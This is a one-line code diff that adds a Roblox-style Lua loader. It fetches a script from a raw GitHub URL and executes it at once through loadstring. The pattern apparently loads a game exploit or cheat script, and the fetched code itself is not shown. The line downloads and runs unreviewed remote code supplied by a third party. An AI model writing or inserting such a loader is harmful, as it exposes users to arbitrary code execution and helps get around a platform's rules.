@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sharky-hub/rivals/refs/heads/main/99nights", true))()
